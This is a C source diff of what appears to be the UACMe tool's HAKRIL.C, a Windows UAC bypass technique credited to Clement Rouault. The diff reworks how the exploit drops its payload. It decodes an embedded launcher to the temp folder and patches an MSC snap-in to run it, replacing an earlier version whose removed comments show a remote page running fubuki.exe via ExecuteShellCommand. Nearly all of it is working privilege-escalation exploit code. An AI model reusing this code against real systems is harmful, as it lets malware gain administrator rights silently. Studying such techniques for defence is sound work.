@@ -4,9 +4,9 @@
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.17
+*  VERSION:     3.22
 *
-*  DATE:        17 Mar 2019
+*  DATE:        07 Nov 2019
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -17,6 +17,7 @@
 *
 *******************************************************************************/
 #include "global.h"
+#include "encresource.h"
 
 LPWSTR g_SnapInParameters = NULL;
 pfnAipFindLaunchAdminProcess g_OriginalFunction = NULL;
@@ -112,15 +113,17 @@ NTSTATUS ucmHakrilMethod(
 
     BOOL bExtracted = FALSE;
     ULONG DataSize = 0, SnapinSize = 0;
-    SIZE_T Dummy;
-    PVOID SnapinResource = NULL, SnapinData = NULL;
+    SIZE_T Dummy, MscBufferSize = 0, MscSize = 0, MscBytesIO = 0;
+    PVOID SnapinResource = NULL, SnapinData = NULL, MscBufferPtr = NULL;
     PVOID ImageBaseAddress = g_hInstance;
     PVOID LaunchAdminProcessPtr = NULL;
     LPWSTR lpText;
+    CHAR *pszMarker;
 
     LPTOP_LEVEL_EXCEPTION_FILTER PreviousFilter;
 
     WCHAR szBuffer[MAX_PATH * 2];
+    CHAR szConvertedBuffer[MAX_PATH * 2];
     SHELLEXECUTEINFO shinfo;
 
     do {
@@ -191,21 +194,80 @@ NTSTATUS ucmHakrilMethod(
             break;
 
         //
-        // Write payload msc snap-in to the %temp%
+        // Build filename for launcher.
         //
-        // All payload of this msc file is a link to external site
+        szBuffer[Dummy] = 0;
+        _strcat(szBuffer, KAMIKAZE_LAUNCHER);
+
+        MscBufferSize = ALIGN_UP_BY(SnapinSize + sizeof(szBuffer), PAGE_SIZE);
+        MscBufferPtr = supVirtualAlloc(
+            &MscBufferSize,
+            DEFAULT_ALLOCATION_TYPE,
+            DEFAULT_PROTECT_TYPE, NULL);
+        if (MscBufferPtr == NULL)
+            break;
+
         //
-        // <String ID="3" Refs="1">https://hfiref0x.github.io/Beacon/uac/exec</String>
+        // Converted filename to ANSI to be used in msc modification next.
         //
-        // Where contents of this page are the following:
+        RtlSecureZeroMemory(szConvertedBuffer, sizeof(szConvertedBuffer));
+        WideCharToMultiByte(CP_ACP, 0, szBuffer, -1, szConvertedBuffer, sizeof(szConvertedBuffer), NULL, NULL);
+
         //
-        // <html><body><script>external.ExecuteShellCommand("%temp%\\fubuki.exe", "%systemdrive%", "", "Restored");</script></body></html>
-        // raw.githubusercontent.com/hfiref0x/Beacon/master/uac/exec.html
-        // 
+        // Write launcher to the %temp%
+        //
+        if (!supDecodeAndWriteBufferToFile(szBuffer,
+            (CONST PVOID)g_encodedKamikazeFinal,
+            sizeof(g_encodedKamikazeFinal),
+            'kmkz'))
+            break;
+
+        //
+        // Build Kamikaze filename.
+        //
         szBuffer[Dummy] = 0;
         _strcat(szBuffer, KAMIKAZE_MSC);
-        if (!supWriteBufferToFile(szBuffer, SnapinData, SnapinSize))
-            break;
+
+        //
+        // Reconfigure msc snapin and write it to the %temp%.
+        //
+        pszMarker = _strstri_a((CHAR*)SnapinData, (const CHAR*)KAMIKAZE_MARKER);
+        if (pszMarker) {
+
+            //
+            // Copy first part of snapin (unchanged).
+            //
+            MscBytesIO = (ULONG)(pszMarker - (PCHAR)SnapinData);
+            MscSize = MscBytesIO;
+            RtlCopyMemory(MscBufferPtr, SnapinData, MscBytesIO);
+
+            //
+            // Copy modified part.
+            //
+            MscBytesIO = (ULONG)_strlen_a(szConvertedBuffer);
+            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), (PVOID)&szConvertedBuffer, MscBytesIO);
+            MscSize += MscBytesIO;
+
+            //
+            // Copy all of the rest.
+            //
+            while (*pszMarker != 0 && *pszMarker != '<') {
+                pszMarker++;
+            }
+
+            MscBytesIO = (ULONG)(((PCHAR)SnapinData + SnapinSize) - pszMarker);
+            RtlCopyMemory(RtlOffsetToPointer(MscBufferPtr, MscSize), pszMarker, MscBytesIO);
+            MscSize += MscBytesIO;
+
+            //
+            // Write result to the file.
+            //
+            if (!supWriteBufferToFile(szBuffer, MscBufferPtr, (ULONG)MscSize))
+                break;
+
+            supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
+            MscBufferPtr = NULL;
+        }
 
         bExtracted = TRUE;
 
@@ -263,9 +325,11 @@ NTSTATUS ucmHakrilMethod(
     //
     // Cleanup.
     //
+    if (MscBufferPtr) {
+        supSecureVirtualFree(MscBufferPtr, MscBufferSize, NULL);
+    }
     if (SnapinData) {
-        RtlSecureZeroMemory(SnapinData, SnapinSize);
-        supVirtualFree(SnapinData, NULL);
+        supSecureVirtualFree(SnapinData, SnapinSize, NULL);
     }
 
     if (g_SnapInParameters) {
@@ -274,11 +338,15 @@ NTSTATUS ucmHakrilMethod(
     }
 
     //
-    // Remove our msc file. Fubuki should be removed by payload code itself as it will be locked on execution.
+    // Remove our msc/launcher file. Fubuki should be removed by payload code itself as it will be locked on execution.
     //
     if (bExtracted) {
         _strcpy(szBuffer, g_ctx->szTempDirectory);
+        Dummy = _strlen(szBuffer);
         _strcat(szBuffer, KAMIKAZE_MSC);
+        DeleteFile(szBuffer);
+        szBuffer[Dummy] = 0;
+        _strcat(szBuffer, KAMIKAZE_LAUNCHER);
         DeleteFile(szBuffer);
     }
 
